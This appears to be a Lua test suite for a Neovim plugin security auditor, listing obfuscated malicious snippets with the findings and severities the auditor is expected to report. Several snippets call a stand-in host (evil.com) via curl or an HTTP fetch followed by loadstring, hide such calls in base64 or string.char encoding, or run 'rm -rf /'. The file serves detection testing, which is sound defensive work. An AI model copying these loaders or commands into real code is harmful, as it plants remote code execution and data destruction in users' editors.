-- Security Test Cases for Obfuscation Detection
-- Tests various detection capabilities of the security audit module

local M = {}

-- Test data with known patterns
M.test_cases = {
  -- Base64 Detection Tests
  base64_tests = {
    {
      name = "Malicious base64 encoded shell command",
      code = [[
        local encoded = "aW8ucG9wZW4oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3BheWxvYWQuc2gnKQ=="
        loadstring(vim.fn.base64decode(encoded))()
      ]],
      expected_findings = { "base64_encoded", "dynamic_code_loading" },
      min_severity = "HIGH",
    },
    {
      name = "Legitimate base64 usage for config",
      code = [[
        local config = { theme = "nord", font_size = 12 }
        local encoded = vim.fn.base64encode(vim.json.encode(config))
        vim.fn.writefile({encoded}, "config.txt")
      ]],
      expected_findings = { "encoding_function" },
      min_severity = "MEDIUM",
    },
    {
      name = "Base64 with network operation",
      code = [[
        local payload = "ZnVuY3Rpb24oKSBpby5wb3BlbignY3VybCBodHRwOi8vZXZpbC5jb20nKSBlbmQ="
        vim.fn.base64decode(payload)
      ]],
      expected_findings = { "base64_encoded" },
      should_be_suspicious = true,
    },
  },

  -- Encryption Pattern Tests
  encryption_tests = {
    {
      name = "XOR obfuscation",
      code = [[
        local function xor_decode(str, key)
          local result = {}
          for i = 1, #str do
            result[i] = string.char(bit.bxor(string.byte(str, i), key))
          end
          return table.concat(result)
        end
        local decoded = xor_decode("\x1a\x1f\x0e", 0x7f)
      ]],
      expected_findings = { "xor_encoding" },
      min_severity = "MEDIUM",
    },
    {
      name = "Excessive hex values",
      code = [[
        local bytes = {
          0x6c, 0x6f, 0x61, 0x64, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67,
          0x28, 0x69, 0x6f, 0x2e, 0x70, 0x6f, 0x70, 0x65, 0x6e, 0x29
        }
      ]],
      expected_findings = { "hex_encoding" },
      min_severity = "MEDIUM",
    },
    {
      name = "URL encoding pattern",
      code = [[
        local url = "http://example.com/api%2Fdata%3Fkey%3Dvalue%26id%3D123"
      ]],
      expected_findings = { "url_encoding" },
      min_severity = "LOW",
    },
  },

  -- Code Obfuscation Tests
  obfuscation_tests = {
    {
      name = "String.char obfuscation",
      code = [[
        local cmd = string.char(105,111,46,112,111,112,101,110)
        _G[cmd]("curl http://evil.com")
      ]],
      expected_findings = { "string_char_obfuscation", "dynamic_function_access" },
      min_severity = "MEDIUM",
    },
    {
      name = "Loadstring with dynamic content",
      code = [[
        local code = "io.popen('curl http://evil.com')"
        loadstring(code)()
      ]],
      expected_findings = { "dynamic_code_loading" },
      min_severity = "HIGH",
    },
    {
      name = "Environment manipulation",
      code = [[
        local env = getfenv(1)
        env.malicious_func = function() os.execute("rm -rf /") end
        setfenv(1, env)
      ]],
      expected_findings = { "environment_manipulation" },
      min_severity = "MEDIUM",
    },
    {
      name = "Table-based code execution",
      code = [[
        local t = {
          [string.char(105,111)] = io,
          [string.char(112,111,112,101,110)] = "popen"
        }
        local io_obj = rawget(t, string.char(105,111))
        local method = rawget(t, string.char(112,111,112,101,110))
      ]],
      expected_findings = { "string_char_obfuscation", "table_manipulation" },
      min_severity = "MEDIUM",
    },
  },

  -- Advanced Threat Tests
  advanced_tests = {
    {
      name = "Multi-stage payload delivery",
      code = [[
        local stage1 = require("http").get("http://evil.com/payload.lua")
        loadstring(stage1)()
      ]],
      expected_findings = { "multi_stage_payload", "dynamic_code_loading" },
      min_severity = "CRITICAL",
    },
    {
      name = "Time-delayed execution",
      code = [[
        vim.defer_fn(function()
          loadstring("io.popen('curl http://evil.com')")()
        end, 5000)
      ]],
      expected_findings = { "time_delayed_execution", "dynamic_code_loading" },
      min_severity = "HIGH",
    },
    {
      name = "Environment fingerprinting",
      code = [[
        if vim.fn.hostname() == "target" then
          local uname = vim.loop.os_uname()
          if uname.sysname == "Linux" then
            os.execute("payload")
          end
        end
      ]],
      expected_findings = { "environment_fingerprinting" },
      min_severity = "MEDIUM",
    },
    {
      name = "Package manipulation",
      code = [[
        package.loaded.malicious = {
          evil = function() os.execute("curl http://evil.com") end
        }
      ]],
      expected_findings = { "package_manipulation" },
      min_severity = "MEDIUM",
    },
    {
      name = "Dynamic process spawn",
      code = [[
        local cmd = "curl" .. " " .. "http://evil.com"
        vim.loop.spawn("sh", {args = {"-c", cmd}})
      ]],
      expected_findings = { "dynamic_process_spawn" },
      min_severity = "HIGH",
    },
  },

  -- Safe Code Tests (should not trigger high severity)
  safe_code_tests = {
    {
      name = "Normal plugin code",
      code = [[
        local M = {}
        function M.setup(opts)
          opts = opts or {}
          vim.keymap.set('n', '<leader>t', function()
            print("Hello")
          end)
        end
        return M
      ]],
      expected_findings = {},
      should_be_safe = true,
    },
    {
      name = "Legitimate data encoding",
      code = [[
        local json = require("json")
        local data = { user = "test", settings = { theme = "dark" } }
        local encoded = vim.fn.base64encode(json.encode(data))
        vim.fn.writefile({encoded}, vim.fn.stdpath("data") .. "/cache.txt")
      ]],
      expected_findings = { "encoding_function" },
      max_severity = "MEDIUM",
    },
  },
}

-- Helper function to write test code to file
function M.write_test_file(code, filepath)
  local file = io.open(filepath, "w")
  if file then
    file:write(code)
    file:close()
    return true
  end
  return false
end

-- Run a single test case
function M.run_test_case(test_case, audit_module)
  local test_file = "/tmp/security_test_" .. os.time() .. ".lua"
  local success = M.write_test_file(test_case.code, test_file)

  if not success then
    return {
      passed = false,
      error = "Failed to write test file",
    }
  end

  local result = audit_module.audit_file(test_file)
  os.remove(test_file)

  local findings_types = {}
  for _, finding in ipairs(result.findings or {}) do
    table.insert(findings_types, finding.type)
  end

  local test_result = {
    name = test_case.name,
    passed = true,
    findings = findings_types,
    details = {},
  }

  -- Check expected findings
  if test_case.expected_findings then
    for _, expected_type in ipairs(test_case.expected_findings) do
      local found = false
      for _, actual_type in ipairs(findings_types) do
        if actual_type == expected_type then
          found = true
          break
        end
      end
      if not found then
        test_result.passed = false
        table.insert(test_result.details, "Missing expected finding: " .. expected_type)
      end
    end
  end

  -- Check minimum severity
  if test_case.min_severity then
    local severity_levels = { LOW = 1, MEDIUM = 2, HIGH = 3, CRITICAL = 4 }
    local min_level = severity_levels[test_case.min_severity] or 0
    local has_sufficient_severity = false

    for _, finding in ipairs(result.findings or {}) do
      local finding_level = severity_levels[finding.severity] or 0
      if finding_level >= min_level then
        has_sufficient_severity = true
        break
      end
    end

    if not has_sufficient_severity and #(result.findings or {}) > 0 then
      test_result.passed = false
      table.insert(test_result.details, "No finding with minimum severity: " .. test_case.min_severity)
    end
  end

  -- Check if should be suspicious
  if test_case.should_be_suspicious then
    local is_suspicious = false
    for _, finding in ipairs(result.findings or {}) do
      if finding.score and finding.score > 10 then
        is_suspicious = true
        break
      end
    end
    if not is_suspicious then
      test_result.passed = false
      table.insert(test_result.details, "Expected suspicious content but score was too low")
    end
  end

  -- Check if should be safe
  if test_case.should_be_safe then
    local has_critical = false
    for _, finding in ipairs(result.findings or {}) do
      if finding.severity == "CRITICAL" or finding.severity == "HIGH" then
        has_critical = true
        break
      end
    end
    if has_critical then
      test_result.passed = false
      table.insert(test_result.details, "Expected safe code but found critical/high severity")
    end
  end

  -- Check max severity
  if test_case.max_severity then
    local severity_levels = { LOW = 1, MEDIUM = 2, HIGH = 3, CRITICAL = 4 }
    local max_level = severity_levels[test_case.max_severity] or 4

    for _, finding in ipairs(result.findings or {}) do
      local finding_level = severity_levels[finding.severity] or 0
      if finding_level > max_level then
        test_result.passed = false
        table.insert(test_result.details, "Finding exceeds max severity: " .. finding.severity)
        break
      end
    end
  end

  return test_result
end

-- Run all tests
function M.run_all_tests()
  -- Try to load the audit module
  local success, audit = pcall(require, "scripts.security_audit")
  if not success then
    print("ERROR: Cannot load security_audit module")
    print("Details: " .. tostring(audit))
    print("\nTroubleshooting:")
    print("  1. Ensure you're running from the repository root")
    print("  2. Check that scripts/security_audit.lua exists")
    print("  3. Verify Lua package path includes the current directory")
    print("  Current path: " .. package.path)
    return false
  end

  local results = {
    total = 0,
    passed = 0,
    failed = 0,
    details = {},
  }

  print("=" .. string.rep("=", 78))
  print("RUNNING SECURITY AUDIT TEST SUITE")
  print("=" .. string.rep("=", 78))
  print()

  -- Run all test categories
  for category, tests in pairs(M.test_cases) do
    print("Category: " .. category)
    print(string.rep("-", 79))

    for _, test_case in ipairs(tests) do
      results.total = results.total + 1
      local test_result = M.run_test_case(test_case, audit)

      if test_result.passed then
        results.passed = results.passed + 1
        print("  ✅ " .. test_case.name)
      else
        results.failed = results.failed + 1
        print("  ❌ " .. test_case.name)
        for _, detail in ipairs(test_result.details) do
          print("     - " .. detail)
        end
      end

      table.insert(results.details, test_result)
    end
    print()
  end

  print("=" .. string.rep("=", 78))
  print("TEST SUMMARY")
  print("=" .. string.rep("=", 78))
  print("Total:  " .. results.total)
  print("Passed: " .. results.passed)
  print("Failed: " .. results.failed)
  print()

  if results.failed == 0 then
    print("✅ All tests passed!")
  else
    print("❌ Some tests failed")
  end
  print()

  return results.failed == 0, results
end

-- Run tests when executed directly
if arg and arg[0] and arg[0]:match("security_test_cases%.lua$") then
  local success, results = M.run_all_tests()
  os.exit(success and 0 or 1)
end

return M
